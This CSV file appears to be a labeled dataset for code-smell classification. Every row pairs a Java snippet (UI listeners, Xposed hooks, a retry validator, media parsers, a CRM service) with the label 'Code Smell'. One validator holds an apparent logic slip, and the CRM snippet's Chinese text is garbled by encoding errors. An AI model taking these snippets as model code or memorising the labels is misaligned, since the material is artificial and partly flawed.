text,label,text_label
"@Override protected PropertyChangeListener createPropertyChangeListener(){
  PropertyChangeListener superListener=super.createPropertyChangeListener();
  return e -> {
    superListener.propertyChange(e);
    Object source=e.getSource();
    String propertyName=e.getPropertyName();
    if (editor != null && ((source == comboBox && propertyName == ""foreground"") || (source == editor && propertyName == ""enabled""))) {
      updateEditorColors();
    }
 else     if (editor != null && source == comboBox && propertyName == ""componentOrientation"") {
      ComponentOrientation o=(ComponentOrientation)e.getNewValue();
      editor.applyComponentOrientation(o);
    }
 else {
switch (propertyName) {
case PLACEHOLDER_TEXT:
        if (editor != null)         HiDPIUtils.repaint(editor);
      break;
case COMPONENT_ROUND_RECT:
case OUTLINE:
    HiDPIUtils.repaint(comboBox);
  break;
case MINIMUM_WIDTH:
comboBox.revalidate();
break;
case STYLE:
case STYLE_CLASS:
installStyle();
comboBox.revalidate();
HiDPIUtils.repaint(comboBox);
break;
}
}
}
;
}
@Override protected PropertyChangeListener createPropertyChangeListener(){
  PropertyChangeListener superListener=super.createPropertyChangeListener();
  return e -> {
    superListener.propertyChange(e);
    if (e.getPropertyName() == ""renderer"")     list.setCellRenderer(new PopupListCellRenderer());
  }
;
}
",1,Code Smell
"@Override public boolean isValid(@Nullable Random value,@NonNull AnnotationValue<RandomRetryValidation> annotationMetadata,@NonNull ConstraintValidatorContext context){
  if (value == null) {
    return true;
  }
  if (value.getMaxDuration() != null && value.getMaxInterval() != null && value.getMaxDuration().compareTo(value.getMinInterval()) <= 0) {
    context.disableDefaultConstraintViolation();
    context.buildConstraintViolationWithTemplate(""'minInterval' must be less than 'maxDuration' but is "" + value.getMinInterval()).addConstraintViolation();
    return false;
  }
  if (value.getMaxDuration() != null && value.getMaxInterval() != null && value.getMaxDuration().compareTo(value.getMaxInterval()) <= 0) {
    context.disableDefaultConstraintViolation();
    context.buildConstraintViolationWithTemplate(""'maxInterval' must be less than 'maxDuration' but is "" + value.getMaxInterval()).addConstraintViolation();
    return false;
  }
  if (value.getMaxInterval() != null && value.getMinInterval() != null && value.getMaxInterval().compareTo(value.getMinInterval()) <= 0) {
    context.disableDefaultConstraintViolation();
    context.buildConstraintViolationWithTemplate(""'minInterval' must be less than 'maxInterval' but is "" + value.getMinInterval()).addConstraintViolation();
    return false;
  }
  return true;
}",1,Code Smell
"@Override public void onScrolled(RecyclerView recyclerView,int dx,int dy){
  int firstVisibleItem=searchLayoutManager.findFirstVisibleItemPosition();
  int lastVisibleItem=searchLayoutManager.findLastVisibleItemPosition();
  int visibleItemCount=Math.abs(searchLayoutManager.findLastVisibleItemPosition() - firstVisibleItem) + 1;
  int totalItemCount=recyclerView.getAdapter().getItemCount();
  if (visibleItemCount > 0 && !dialogsSearchAdapter.isMessagesSearchEndReached() && (lastVisibleItem == totalItemCount - 1 || dialogsSearchAdapter.delegate != null && dialogsSearchAdapter.delegate.getSearchForumDialogId() != 0 && dialogsSearchAdapter.localMessagesLoadingRow >= 0 && firstVisibleItem <= dialogsSearchAdapter.localMessagesLoadingRow && lastVisibleItem >= dialogsSearchAdapter.localMessagesLoadingRow)) {
    dialogsSearchAdapter.loadMoreSearchMessages();
  }
  fragmentView.invalidateBlur();
}
@Override public void onScrolled(@NonNull RecyclerView recyclerView,int dx,int dy){
  super.onScrolled(recyclerView,dx,dy);
  fragmentView.invalidateBlur();
}
@Override public void onScrolled(@NonNull RecyclerView recyclerView,int dx,int dy){
  super.onScrolled(recyclerView,dx,dy);
  fragmentView.invalidateBlur();
}
@Override public void onScrolled(@NonNull RecyclerView recyclerView,int dx,int dy){
  super.onScrolled(recyclerView,dx,dy);
  fragmentView.invalidateBlur();
}",1,Code Smell
"public static String getFileUUID(FileMessageBean fileMessageBean){
  if (fileMessageBean != null && fileMessageBean.getV2TIMMessage() != null && fileMessageBean.getV2TIMMessage().getFileElem() != null) {
    return fileMessageBean.getV2TIMMessage().getFileElem().getUUID();
  }
  return null;
}",1,Code Smell
"@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  if (taskbarMode == TASKBAR_ON && model != null) {
    XposedHelpers.callMethod(model,""onAppIconChanged"",BuildConfig.APPLICATION_ID,UserHandle.getUserHandleForUid(0));
  }
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  model=param.thisObject;
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  if (taskbarMode == TASKBAR_ON && TaskbarRadiusOverride != 1f) {
    param.setResult(Math.round((int)param.getResult() * TaskbarRadiusOverride));
  }
}
@SuppressLint(""DiscouragedApi"") @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  if (taskbarMode == TASKBAR_DEFAULT)   return;
  boolean taskbarEnabled=taskbarMode == TASKBAR_ON;
  if (taskbarEnabled) {
    numShownHotseatIcons=getIntField(param.thisObject,""numShownHotseatIcons"") + (TaskbarHideAllAppsIcon ? 1 : 0);
    Resources res=mContext.getResources();
    setObjectField(param.thisObject,taskbarHeightField,res.getDimensionPixelSize(res.getIdentifier(""taskbar_size"",""dimen"",mContext.getPackageName())));
    setObjectField(param.thisObject,stashedTaskbarHeightField,res.getDimensionPixelSize(res.getIdentifier(""taskbar_stashed_size"",""dimen"",mContext.getPackageName())));
    if (taskbarHeightOverride != 1f) {
      setObjectField(param.thisObject,taskbarHeightField,Math.round(getIntField(param.thisObject,taskbarHeightField) * taskbarHeightOverride));
    }
  }
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  if (taskbarMode == TASKBAR_ON && TaskbarAsRecents && mItemsLength > 0)   ((View)param.args[0]).setOnClickListener(listener);
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  TaskBarView=(ViewGroup)param.thisObject;
  if (taskbarMode == TASKBAR_ON && TaskbarHideAllAppsIcon)   setObjectField(TaskBarView,""mAllAppsButton"",null);
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  recentTasksList=param.thisObject;
}
@Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
  TaskbarModelCallbacks=param.thisObject;
}",1,Code Smell
"@Override public void deserialize(SourceRecord record,Collector<T> out) throws Exception {
  deserializer.deserialize(record,new CallbackCollector<>(inputRow -> {
    if (sourceMetricData != null) {
      sourceMetricData.outputMetricsWithEstimate(record.value());
    }
    out.collect(inputRow);
  }
));
}
@Override public void deserialize(SourceRecord record,Collector<T> out,TableChange tableSchema) throws Exception {
  deserializer.deserialize(record,new CallbackCollector<>(inputRow -> {
    if (sourceMetricData != null && record != null && migrateAll) {
      Struct value=(Struct)record.value();
      Struct source=value.getStruct(Envelope.FieldName.SOURCE);
      String dbName=source.getString(AbstractSourceInfo.DATABASE_NAME_KEY);
      String schemaName=source.getString(AbstractSourceInfo.SCHEMA_NAME_KEY);
      String tableName=source.getString(AbstractSourceInfo.TABLE_NAME_KEY);
      SnapshotRecord snapshotRecord=SnapshotRecord.fromSource(source);
      boolean isSnapshotRecord=(SnapshotRecord.TRUE == snapshotRecord);
      sourceMetricData.outputMetricsWithEstimate(dbName,schemaName,tableName,isSnapshotRecord,value);
    }
 else     if (sourceMetricData != null && record != null) {
      sourceMetricData.outputMetricsWithEstimate(record.value());
    }
    out.collect(inputRow);
  }
),tableSchema);
}
",1,Code Smell
"@Override public int read(ExtractorInput input,PositionHolder seekPosition) throws IOException, InterruptedException {
  int currentFileSize=(int)input.getLength();
  if (sampleSize == sampleData.length) {
    sampleData=Arrays.copyOf(sampleData,(currentFileSize != C.LENGTH_UNSET ? currentFileSize : sampleData.length) * 3 / 2);
  }
  int bytesRead=input.read(sampleData,sampleSize,sampleData.length - sampleSize);
  if (bytesRead != C.RESULT_END_OF_INPUT) {
    sampleSize+=bytesRead;
    if (currentFileSize == C.LENGTH_UNSET || sampleSize != currentFileSize) {
      return Extractor.RESULT_CONTINUE;
    }
  }
  processSample();
  return Extractor.RESULT_END_OF_INPUT;
}",1,Code Smell
"protected static Authenticator getAuthenticator(final OAuth2Client oAuth2Client,final OAuth2State OAuth2State){
  return (route,response) -> {
    String credential="""";
    OAuth2State.nextState();
    if (OAuth2State.isBasicAuth()) {
      credential=Credentials.basic(oAuth2Client.getUsername(),oAuth2Client.getPassword());
    }
 else     if (OAuth2State.isAuthorizationAuth()) {
      credential=Credentials.basic(oAuth2Client.getClientId(),oAuth2Client.getClientSecret());
    }
 else     if (OAuth2State.isFinalAuth()) {
      return null;
    }
    return response.request().newBuilder().header(OAuth2Constant.HEADER_AUTHORIZATION,credential).build();
  }
;
}",1,Code Smell
"/** 
 * Skips scaling_list_data(). See H.265/HEVC (2014) 7.3.4.
 */
private static void skipScalingList(ParsableNalUnitBitArray bitArray){
  for (int sizeId=0; sizeId < 4; sizeId++) {
    for (int matrixId=0; matrixId < 6; matrixId+=sizeId == 3 ? 3 : 1) {
      if (!bitArray.readBit()) {
        bitArray.readUnsignedExpGolombCodedInt();
      }
 else {
        int coefNum=Math.min(64,1 << (4 + (sizeId << 1)));
        if (sizeId > 1) {
          bitArray.readSignedExpGolombCodedInt();
        }
        for (int i=0; i < coefNum; i++) {
          bitArray.readSignedExpGolombCodedInt();
        }
      }
    }
  }
}",1,Code Smell
"public void onPrepared(){
  Log.i(TAG,""onPrepared "" + "" ["" + this.hashCode() + ""] "");
  state=STATE_PREPARED;
  if (!preloading) {
    mediaInterface.start();
    preloading=false;
  }
  if (jzDataSource.getCurrentUrl().toString().toLowerCase().contains(""mp3"") || jzDataSource.getCurrentUrl().toString().toLowerCase().contains(""wma"") || jzDataSource.getCurrentUrl().toString().toLowerCase().contains(""aac"")|| jzDataSource.getCurrentUrl().toString().toLowerCase().contains(""m4a"")|| jzDataSource.getCurrentUrl().toString().toLowerCase().contains(""wav"")) {
    onStatePlaying();
  }
}",1,Code Smell
"/** 
 * @author IzzelAliz
 * @reason
 */
@Overwrite public static void spawnForChunk(ServerLevel world,LevelChunk chunk,NaturalSpawner.SpawnState manager,boolean flag,boolean flag1,boolean flag2){
  world.getProfiler().push(""spawner"");
  MobCategory[] classifications=SPAWNING_CATEGORIES;
  LevelData worldInfo=world.getLevelData();
  for (  MobCategory classification : classifications) {
    boolean spawnThisTick=true;
    int limit=classification.getMaxInstancesPerChunk();
    SpawnCategory spawnCategory=CraftSpawnCategory.toBukkit(classification);
    if (CraftSpawnCategory.isValidForLimits(spawnCategory)) {
      spawnThisTick=((WorldBridge)world).bridge$ticksPerSpawnCategory().getLong(spawnCategory) != 0 && worldInfo.getGameTime() % ((WorldBridge)world).bridge$ticksPerSpawnCategory().getLong(spawnCategory) == 0;
      limit=((WorldBridge)world).bridge$getWorld().getSpawnLimit(spawnCategory);
    }
    if (spawnThisTick) {
      if (limit != 0) {
        if ((flag || !classification.isFriendly()) && (flag1 || classification.isFriendly()) && (flag2 || !classification.isPersistent())&& ((WorldEntitySpawnerBridge.EntityDensityManagerBridge)manager).bridge$canSpawn(classification,chunk.getPos(),limit)) {
          spawnCategoryForChunk(classification,world,chunk,((WorldEntitySpawnerBridge.EntityDensityManagerBridge)manager)::bridge$canSpawn,((WorldEntitySpawnerBridge.EntityDensityManagerBridge)manager)::bridge$updateDensity);
        }
      }
    }
  }
  world.getProfiler().pop();
}",1,Code Smell
"/** 
 * Creates a  {@link Sort} by expressions, with limit and offset. 
 */
public RelBuilder sortLimit(int offset,int fetch,RexNode... nodes){
  return sortLimit(offset,fetch,ImmutableList.copyOf(nodes));
}
/** 
 * Creates a  {@link Sort} by a list of expressions, with limit and offset.
 * @param offset Number of rows to skip; non-positive means don't skip any
 * @param fetch Maximum number of rows to fetch; negative means no limit
 * @param nodes Sort expressions
 */
public RelBuilder sortLimit(int offset,int fetch,Iterable<? extends RexNode> nodes){
  final Registrar registrar=new Registrar(fields());
  final List<RelFieldCollation> fieldCollations=registrar.registerFieldCollations(nodes);
  final RexNode offsetNode=offset <= 0 ? null : literal(offset);
  final RexNode fetchNode=fetch < 0 ? null : literal(fetch);
  if (offsetNode == null && fetch == 0) {
    return empty();
  }
  if (offsetNode == null && fetchNode == null && fieldCollations.isEmpty()) {
    return this;
  }
  if (fieldCollations.isEmpty()) {
    assert registrar.addedFieldCount() == 0;
    RelNode top=peek();
    if (top instanceof Sort) {
      final Sort sort2=(Sort)top;
      if (sort2.offset == null && sort2.fetch == null) {
        replaceTop(sort2.getInput());
        final RelNode sort=sortFactory.createSort(peek(),sort2.collation,offsetNode,fetchNode);
        replaceTop(sort);
        return this;
      }
    }
    if (top instanceof Project) {
      final Project project=(Project)top;
      if (project.getInput() instanceof Sort) {
        final Sort sort2=(Sort)project.getInput();
        if (sort2.offset == null && sort2.fetch == null) {
          final RelNode sort=sortFactory.createSort(sort2.getInput(),sort2.collation,offsetNode,fetchNode);
          replaceTop(projectFactory.createProject(sort,project.getProjects(),Pair.right(project.getNamedProjects())));
          return this;
        }
      }
    }
  }
  if (registrar.addedFieldCount() > 0) {
    project(registrar.extraNodes);
  }
  final RelNode sort=sortFactory.createSort(peek(),RelCollations.of(fieldCollations),offsetNode,fetchNode);
  replaceTop(sort);
  if (registrar.addedFieldCount() > 0) {
    project(registrar.originalExtraNodes);
  }
  return this;
}",1,Code Smell
"/** 
 * 鍟嗘満闃舵鎺ㄨ繘
 * @param businessStatusBO data
 */
@Override public void boostBusinessStatus(CrmBusinessStatusBO businessStatusBO){
  CrmBusiness byId=crmBusinessService.getById(businessStatusBO.getBusinessId());
  if (byId.getStatus() != 3) {
    String statusName="""";
    if (businessStatusBO.getIsEnd() == null) {
      CrmBusinessChange change=new CrmBusinessChange();
      change.setBusinessId(businessStatusBO.getBusinessId());
      change.setStatusId(businessStatusBO.getStatusId());
      change.setCreateTime(DateUtil.date());
      change.setCreateUserId(UserUtil.getUserId());
      crmBusinessChangeService.save(change);
      byId.setStatusId(businessStatusBO.getStatusId());
      crmBusinessService.updateById(byId);
      CrmBusinessStatus one=crmBusinessStatusService.lambdaQuery().select(CrmBusinessStatus::getName).eq(CrmBusinessStatus::getStatusId,businessStatusBO.getStatusId()).one();
      statusName=one.getName();
    }
 else {
      if (businessStatusBO.getIsEnd() == 1) {
        statusName=""璧㈠崟"";
      }
 else       if (businessStatusBO.getIsEnd() == 2) {
        statusName=""杈撳崟"";
      }
 else       if (businessStatusBO.getIsEnd() == 3) {
        statusName=""鏃犳晥"";
      }
      byId.setIsEnd(businessStatusBO.getIsEnd());
      byId.setStatusRemark(businessStatusBO.getStatusRemark());
      crmBusinessService.updateById(byId);
    }
    crmActivityService.addActivity(3,CrmActivityEnum.BUSINESS,businessStatusBO.getBusinessId(),statusName);
    Map<String,Object> map=new HashMap<>();
    if (businessStatusBO.getIsEnd() == null) {
      map.put(""statusId"",businessStatusBO.getStatusId());
    }
 else {
      map.put(""isEnd"",businessStatusBO.getIsEnd());
      map.put(""statusId"",null);
    }
    map.put(""statusName"",statusName);
    ApplicationContextHolder.getBean(CrmBusinessServiceImpl.class).updateField(map,Collections.singletonList(byId.getBusinessId()));
  }
}",1,Code Smell
